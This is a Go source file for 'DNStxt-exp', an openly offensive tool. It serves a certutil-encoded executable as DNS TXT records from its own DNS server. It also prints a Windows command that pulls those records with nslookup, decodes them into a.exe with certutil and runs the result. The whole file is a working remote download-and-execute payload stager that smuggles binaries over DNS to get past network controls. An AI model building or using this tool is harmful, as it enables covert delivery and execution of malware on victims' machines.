package main

import (
	"dnstxt-exp/dns"
	"dnstxt-exp/utils"
	"flag"
	"fmt"
	"syscall"
)

var (
	serverName string
	port       int
	encodeFile string
	prefixFlag string
	textRecord []string
)

const banner = `
_____________   _____________       _____                            
___  __ \__  | / /_  ___/_  /____  ___  /_      _________  _________ 
__  / / /_   |/ /_____ \_  __/_  |/_/  __/_______  _ \_  |/_/__  __ \
_  /_/ /_  /|  / ____/ // /_ __>  < / /_ _/_____/  __/_>  < __  /_/ /
/_____/ /_/ |_/  /____/ \__/ /_/|_| \__/        \___//_/|_| _  .___/ 
                                                            /_/
`
const version = "0.0.1"

func parseFlag() {
	flag.StringVar(&encodeFile, "f", "encode.txt", "Generate encode.txt file command: "+
		"==> certutil.exe -encode artifact.exe encode.txt <==\n")
	flag.StringVar(&serverName, "name", "public1.alidns.com", "DNS server name")
	flag.IntVar(&port, "p", 53, "DNS server port")
	flag.StringVar(&prefixFlag, "flag", "exec", "Add prefix flag to lines")
	flag.Parse()
}

func printBanner() {
	fmt.Printf("%s\n", banner[1:])
	fmt.Printf("DNStxt-exp Version: %s -- Created by vaycore\n\n", version)
}

func printHelp() {
	fmt.Println("Options:")
	flag.PrintDefaults()
	fmt.Println()
}

func onInit() {
	parseFlag()
	// check file exists
	if !utils.FileExists(encodeFile) {
		printHelp()
		fmt.Printf("encode file %s is not exists\n", encodeFile)
		syscall.Exit(1)
	}
	// check file lines
	lines := utils.FileReadingLines(encodeFile)
	if len(lines) == 0 {
		printHelp()
		fmt.Printf("encode file %s no content!\n", encodeFile)
		syscall.Exit(1)
	}
	// add prefix flag to lines
	for _, line := range lines {
		newLine := prefixFlag + line
		textRecord = append(textRecord, newLine)
	}
}

func main() {
	printBanner()
	onInit()
	fmt.Println("Revert file and run:")
	fmt.Println(`cmd /v:on /Q /c "set a= && set b= && ` +
		`for /f "tokens=*" %i in ('nslookup -qt^=TXT www.baidu.com 0.0.0.0 ^| findstr "exec"') ` +
		`do (set a=%i && echo !a:~5,-2!)" > d.txt && certutil -decode d.txt a.exe && cmd /c a.exe`)
	fmt.Println()
	server := dns.CreateServer(serverName, port, textRecord)
	server.StartDNSServer()
}
